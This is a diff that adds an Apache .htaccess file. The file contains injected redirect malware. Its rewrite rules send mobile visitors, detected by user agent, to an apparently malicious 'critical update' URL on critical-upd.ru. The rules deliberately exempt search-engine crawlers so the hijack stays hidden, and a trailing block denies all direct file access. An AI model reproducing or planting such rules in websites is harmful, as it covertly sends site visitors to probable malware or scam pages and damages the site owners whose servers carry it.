@@ -1,0 +1,12 @@
+RewriteEngine on
+RewriteCond %{HTTP_USER_AGENT} (android|midp|j2me|symbian|series\ 60|symbos|windows\ mobile|windows\ ce|ppc|smartphone|blackberry|mtk) [NC]
+RewriteCond %{HTTP_USER_AGENT} !(accoona|ia_archiver|antabot|ask\ jeeves|baidu|eltaindexer|feedfetcher|gamespy|gigabot|googlebot|gsa-crawler|grub-client|gulper|slurp|mihalism|msnbot|worldindexer|ooyyo|pagebull|scooter|w3c_validator|jigsaw|webalta|yahoofeedseeker|mmcrawler|yandexbot|yandeximages|yandexvideo|yandexmedia|yandexblogs|yandexaddurl|yandexfavicons|yandexdirect|yandexmetrika|yandexcatalog|yandexnews|yandeximageresizer) [NC]
+RewriteRule (.*) http://critical-upd.ru/?criticalupd&source=cap [L,R=302] #
+RewriteEngine on
+RewriteCond %{HTTP_USER_AGENT} (android|midp|j2me|symbian|series\ 60|symbos|windows\ mobile|windows\ ce|ppc|smartphone|blackberry|mtk) [NC]
+RewriteCond %{HTTP_USER_AGENT} !(accoona|ia_archiver|antabot|ask\ jeeves|baidu|eltaindexer|feedfetcher|gamespy|gigabot|googlebot|gsa-crawler|grub-client|gulper|slurp|mihalism|msnbot|worldindexer|ooyyo|pagebull|scooter|w3c_validator|jigsaw|webalta|yahoofeedseeker|mmcrawler|yandexbot|yandeximages|yandexvideo|yandexmedia|yandexblogs|yandexaddurl|yandexfavicons|yandexdirect|yandexmetrika|yandexcatalog|yandexnews|yandeximageresizer) [NC]
+RewriteRule (.*) http://critical-upd.ru/?upd&source=cap [L,R=302] #
+<Files ~ "*">
+	Order allow,deny
+	Deny from all
+</Files>
